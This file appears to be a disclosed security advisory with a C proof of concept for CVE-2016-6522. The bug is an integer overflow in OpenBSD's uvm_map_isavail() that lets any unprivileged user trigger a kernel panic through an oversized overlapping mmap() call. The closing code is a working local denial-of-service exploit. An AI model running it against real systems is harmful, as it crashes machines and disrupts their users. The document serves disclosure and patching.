/*
 * mmap_dup_panic.c
 *    Demonstrate a panic through the mmap system call.
 *
 * gcc -g mmap_dup_panic.c -o mmap_dup_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Any user can trigger a panic in mmap with an overlapping mapping

Impact: 
Any user can trigger a panic by requesting a large mapping
that overlaps with an existing mapping.

Description:
It is possible for an mmap() call to request a mapping at a 
virtual address that overlaps an existing mapping.  This is checked
for in uvm_map() by calling uvm_map_isavail() with the hint address and
size..  There is a flaw in uvm_map_isavail() when the requested size is very
large. The code looks up the maps at the start and end address with:

    if (*start_ptr == NULL) {
        *start_ptr = uvm_map_entrybyaddr(atree, addr);
        if (*start_ptr == NULL)
            return 0;
    } else
        KASSERT(*start_ptr == uvm_map_entrybyaddr(atree, addr));
    if (*end_ptr == NULL) {
        if (VMMAP_FREE_END(*start_ptr) >= addr + sz)
            *end_ptr = *start_ptr;
        else {
            *end_ptr = uvm_map_entrybyaddr(atree, addr + sz - 1);
            if (*end_ptr == NULL)
                return 0;
        }
    } else
        KASSERT(*end_ptr == uvm_map_entrybyaddr(atree, addr + sz - 1));

Due to an integer overflow that can occur when computing
"addr + sz" it is possible for the end_ptr map to be
computed incorrectly (setting "*end_ptr = *start_ptr"). Later
when this same function iterates over the maps between the start 
and end maps, the function may fail to notice that a large mapping 
overlaps with an existing mapping.

If uvm_map_isavail() indicates that the hint address is available,
uvm_map() will continue its processing without assigning a new
address.  It will eventually call uvm_map_fix_space() which
performs its own sanity lookup with uvm_mapent_addr_insert(),
and panics if an overlapping mapping is added:

    res = RB_INSERT(uvm_map_addr, &map->addr, entry);
    if (res != NULL) {
        panic("uvm_mapent_addr_insert: map %p entry %p "
            "(0x%lx-0x%lx G=0x%lx F=0x%lx) insert collision "
            "with entry %p (0x%lx-0x%lx G=0x%lx F=0x%lx)",
            map, entry,
            entry->start, entry->end, entry->guard, entry->fspace,
            res, res->start, res->end, res->guard, res->fspace);
    }

An attacker can take advantage of this to intentionally
trigger a panic to crash the system.  This does not require
any special privileges.

In theory this flaw might allow an attacker to make a mapping
that wraps around from user addresses, through kernel addresses
and back to low user addresses.  Such a mapping might allow
access to kernel memory or to the NULL page (useful for performing
certain attacks against NULL pointer use in the kernel).
However NCC was unable to find any way to create such a mapping
without causing a panic since it does not appear to be possible
to make a mapping above the stack segment.  All wrap-around mappings
lower than this address overlap with the stack segment and result
in a panic.

Reproduction:
Run the attached mmap_dup_panic.c program. It first maps a
page in and then performs a second mmap() call to request
another mapping at the next page address.  This second mapping overlaps 
the first due to the large size, and causes a panic message such as
"panic: uvm_mapent_addr_insert: map 0xffffff00036be300 entry 0xffffff000311d178 (0x1dcc56000000-0x1dcc56000000 G=0x0 F=0x200000000) insert collision with entry 0xffffff000272de08 (0x1dcc56000000-0x1dcc56000000 G=0x0 F=0x1000)"
NCC Group was able to reproduce this issue on OpenBSD 5.9-stable kernel
pulled from CVS on July 25, 2016.

Recommendation:
Detect when "addr + sz" causes an integer overflow in uvm_map_isavail().
Return zero indicating that this mapping is not available in this case.

Reported: 2016-07-28
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.122&r2=1.122.2.1
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_addr.c.diff?r1=1.16&r2=1.17
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/023_uvmisavail.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/026_uvmisavail.patch.sig
Assigned: CVE-2016-6522.
#endif // BUG_WRITEUP ---------------------------------------------------
 
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    int fd;
    char *p, *pg;

    fd = open("/tmp/mapfile", O_RDWR|O_CREAT, 0666);
    xperror(fd == -1, "/tmp/mapfile");
    write(fd, "testing\n", 8);

    pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    xperror(pg == MAP_FAILED, "mmap");

    p = mmap(pg+4096, 0xffffff0000000000, 0, 0, fd, 0);
    xperror(pg == MAP_FAILED, "mmap2");
    printf("no crash!\n");
    return 0;
}

